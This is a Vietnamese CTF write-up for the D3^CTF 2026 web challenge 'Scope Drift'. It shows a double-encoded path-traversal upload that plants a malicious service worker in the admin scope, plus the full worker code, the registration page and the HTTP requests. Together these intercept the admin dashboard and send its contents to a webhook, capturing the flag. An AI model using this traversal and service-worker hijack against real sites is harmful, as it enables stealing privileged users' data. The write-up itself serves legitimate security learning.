# D3^CTF 2026

## 1. Web - Scope Drift

### Mô tả bài

Challenge cung cấp một website:

```text
http://rzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf
```

Ứng dụng có các chức năng chính:

- `/upload`: cho phép upload file theo `path` và `content`.
- `/u/guest/...`: thư mục public của user `guest`.
- `/u/admin/...`: thư mục và dashboard của admin.
- `/bot?url=...`: cho bot admin truy cập một URL do mình chỉ định.
- `/webhook/guest` và `/inbox`: dùng để nhận log/exfil dữ liệu.

Mục tiêu là đọc nội dung `/u/admin/dashboard`.

---

### Phân tích

Đầu tiên, ta kiểm tra chức năng upload. Endpoint `/upload` nhận body dạng:

```http
POST /upload HTTP/1.1
Host: rzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf
Content-Type: application/x-www-form-urlencoded

path=...&content=...
```

Khi upload file bình thường vào `/u/guest/`, file có thể truy cập được:

```text
/u/guest/x.html
```

Điểm quan trọng là server xử lý path qua nhiều lần decode không nhất quán. Payload traversal sai là:

```text
/u/guest/%252e%252e%252fadmin/sw.js
```

Biến thể bypass đúng cần double-encode thêm dấu `/`:

```text
/u/guest/%252e%252e%25252fadmin/sw.js
```

Khi gửi qua form-urlencoded, path upload tương ứng là:

```text
path=%2Fu%2Fguest%2F%252e%252e%25252fadmin%2Fsw.js
```

Nhờ đó, ta ghi được file service worker vào:

```text
/u/admin/sw.js
```

Sau khi kiểm tra:

```http
GET /u/admin/sw.js HTTP/1.1
Host: rzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf
```

nếu response có code `self.addEventListener(...)` thì upload đã thành công.

---

### Root cause

Lỗi chính là **path traversal do decode URL nhiều tầng không nhất quán**.

Server cố giới hạn user `guest` chỉ được upload vào `/u/guest/`, nhưng lại normalize/decode path theo cách cho phép chuỗi:

```text
%252e%252e%25252f
```

sau nhiều bước xử lý trở thành:

```text
../
```

Từ đó attacker có thể thoát khỏi thư mục guest và ghi file sang `/u/admin/`.

Impact trở nên nghiêm trọng hơn vì file ghi được là `sw.js`. Browser cho phép đăng ký service worker với scope:

```js
navigator.serviceWorker.register('/u/admin/sw.js', {
  scope: '/u/admin/'
});
```

Khi bot admin truy cập trang guest, script guest có thể đăng ký service worker nằm trong scope admin. Service worker này sau đó intercept request tới `/u/admin/dashboard`.

---

### Exploit

Service worker cần:

- `skipWaiting()` để activate ngay.
- `clients.claim()` để claim client.
- bật `navigationPreload`.
- intercept `/u/admin/dashboard`.
- đọc `preloadResponse` rồi gửi body về `/webhook/guest`.

Payload rút gọn:

```js
self.addEventListener('install', e => e.waitUntil(self.skipWaiting()));

self.addEventListener('activate', e => e.waitUntil((async () => {
  if (self.registration.navigationPreload) {
    await self.registration.navigationPreload.enable();
  }
  await self.clients.claim();
})()));

async function send(x) {
  x = String(x);
  for (let i = 0; i < x.length; i += 1500) {
    await fetch('/webhook/guest', {
      method: 'POST',
      headers: {'Content-Type': 'text/plain'},
      body: x.slice(i, i + 1500)
    });
  }
}

self.addEventListener('fetch', e => {
  const u = new URL(e.request.url);
  if (u.pathname !== '/u/admin/dashboard') return;

  e.respondWith((async () => {
    await send(
      'ADMIN-SW-HIT ' +
      u.pathname +
      ' mode=' + e.request.mode +
      ' cred=' + e.request.credentials +
      ' dest=' + e.request.destination +
      ' ref=' + e.request.referrer
    );

    const r = await e.preloadResponse || await fetch(e.request);
    const t = await r.clone().text();

    await send(
      'ADMIN-SW-NET /u/admin/dashboard STATUS ' +
      r.status +
      '\n' +
      t
    );

    return r;
  })());
});
```

Upload bằng path traversal:

```http
POST /upload HTTP/1.1
Host: rzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf
Content-Type: application/x-www-form-urlencoded

path=%2Fu%2Fguest%2F%252e%252e%25252fadmin%2Fsw.js&content=<urlencoded service worker>
```

Tạo `/u/guest/x.html`:

```html
<!doctype html>
<script>
(async () => {
  async function log(x) {
    await fetch('/webhook/guest', {
      method: 'POST',
      headers: {'Content-Type': 'text/plain'},
      body: String(x)
    });
  }

  function waitActive(reg) {
    const sw = reg.installing || reg.waiting || reg.active;
    if (!sw || sw.state === 'activated') return Promise.resolve();

    return new Promise(resolve => {
      sw.addEventListener('statechange', () => {
        log('admin-sw-state ' + sw.state);
        if (sw.state === 'activated') resolve();
      });
    });
  }

  await log(
    'register-admin-sw-start ' +
    location.href +
    ' secure=' + isSecureContext +
    ' sw=' + ('serviceWorker' in navigator)
  );

  try {
    const reg = await navigator.serviceWorker.register(
      '/u/admin/sw.js?b=' + Date.now(),
      {scope: '/u/admin/'}
    );

    await log('register-admin-sw-registered ' + reg.scope);
    await waitActive(reg);
    await log('register-admin-sw-active ' + reg.scope);

    location.href = '/u/admin/dashboard?nav=' + Date.now();
  } catch (e) {
    await log('register-admin-sw-error ' + e.name + ': ' + e.message);
  }
})();
</script>
```

Upload:

```http
POST /upload HTTP/1.1
Host: rzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf
Content-Type: application/x-www-form-urlencoded

path=%2Fu%2Fguest%2Fx.html&content=<urlencoded html>
```

Gửi bot vào trang guest:

```http
GET /bot?url=http%3A%2F%2Frzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf%2Fu%2Fguest%2Fx.html HTTP/1.1
Host: rzsn43piellrfc2ccalxnqx2kwu.cloud.d3c.tf
Connection: close
```

Sau đó xem `/inbox`. Log thành công:

```text
register-admin-sw-start http://localhost:3000/u/guest/x.html secure=true sw=true
register-admin-sw-registered http://localhost:3000/u/admin/
register-admin-sw-active http://localhost:3000/u/admin/
ADMIN-SW-HIT /u/admin/dashboard mode=navigate cred=include dest=document ref=http://localhost:3000/u/guest/x.html
ADMIN-SW-NET preload /u/admin/dashboard STATUS 200
```

Response body:

```html
<!doctype html>
<html>
<head><meta charset="utf-8"><title>Admin Dashboard</title></head>
<body>
  <h1>Admin Dashboard</h1>
  <p>Private deployment note: <code>d3ctf{seRv1cE-workEr_scOPe-c0NfUSloNe89a6b}</code></p>
</body>
</html>
```

---

**Flag**

```text
d3ctf{seRv1cE-workEr_scOPe-c0NfUSloNe89a6b}
```

